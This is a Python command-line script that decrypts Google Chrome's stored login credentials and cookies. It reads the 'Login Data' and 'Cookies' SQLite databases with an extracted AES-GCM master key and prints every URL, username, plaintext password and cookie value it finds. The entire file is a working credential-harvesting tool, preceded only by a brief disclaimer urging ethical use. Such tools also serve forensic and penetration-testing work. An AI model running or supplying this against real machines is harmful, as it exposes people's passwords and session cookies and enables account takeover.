#!/usr/bin/env python3

"""
Filename: chromeDekrptyk.py
Author: Krptyk
Last Updated: 28/10/2023
Description: A utility to decrypt Chrome encrypted data 
             (either cookies or login credentials) from Google Chrome's SQLite databases.
Usage:
    For cookies:
    ./script_name.py -f path_to_cookies_db -k path_to_master_key -t cookies

    For login credentials:
    ./script_name.py -f path_to_login_data_db -k path_to_master_key -t login
Disclaimer:
    Use this script responsibly and ethically. Always seek appropriate permissions
    and abide by all applicable laws and guidelines.
"""

import os
import sqlite3
import shutil
from Crypto.Cipher import AES
import argparse
from datetime import datetime, timedelta

def chrome_time_conversion(chromedate):
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    except:
        return chromedate

def decrypt_value(buff, master_key):
    try:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "Chrome < 80"

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return "Chrome < 80"

def display_credentials(url, username, decrypted_password):
    separator = "-" * 60
    print(separator)
    print(f"URL: {url}")
    print(f"User Name: {username}")
    print(f"Password: {decrypted_password}")
    print(separator)
    print("\n")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Retrieve Encrypted Chrome Details.")
    
    parser.add_argument(
        "-f", "--file", 
        required=True, 
        help="""Path to the Chrome database. 
For 'cookies', provide the path to the 'Cookies' SQLite database.
For 'login', provide the path to the 'Login Data' SQLite database."""
    )
    
    parser.add_argument(
        "-k", "--key", 
        required=True, 
        help="""Path to the master encryption key file.
This key is crucial for decrypting the database content. 
Typically found within the Chrome's 'User Data' directory under a file named 'Local State', but you should extract the key from it."""
    )
    
    parser.add_argument(
        "-t", "--type", 
        choices=['cookies', 'login'], 
        required=True, 
        help="""Type of data to retrieve.
- 'cookies': To retrieve encrypted cookies data.
- 'login': To retrieve saved login credentials (usernames & passwords)."""
    )
    
    args = parser.parse_args()

    with open(args.key, 'rb') as f:
        master_key = f.read()

    temp_db = f"Temp_{args.type}.db"
    shutil.copy2(args.file, temp_db)

    with sqlite3.connect(temp_db) as conn:
        cursor = conn.cursor()

        if args.type == "cookies":
            grouped_data = {}
            for row in cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc FROM cookies"):
                host_key = row[0]
                data = {
                    'name': row[1],
                    'decrypted_value': decrypt_value(row[2], master_key),
                    'creation_utc': chrome_time_conversion(row[3]),
                    'last_access_utc': chrome_time_conversion(row[4]),
                    'expires_utc': chrome_time_conversion(row[5])
                }
                grouped_data.setdefault(host_key, []).append(data)
            
            for host, cookies in grouped_data.items():
                print("=" * 70)
                print(f"Host: {host}")
                for cookie in cookies:
                    print("\n".join(f"{key.title().replace('_', ' ')}: {val}" for key, val in cookie.items()), "\n")
                print("=" * 70, "\n")

        elif args.type == "login":
            for row in cursor.execute("SELECT action_url, origin_url, username_value, password_value FROM logins"):
                action_url = row[0]
                origin_url = row[1]
                url = action_url if action_url else origin_url
                username = row[2]
                encrypted_password = row[3]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                display_credentials(url, username, decrypted_password)

    os.remove(temp_db)
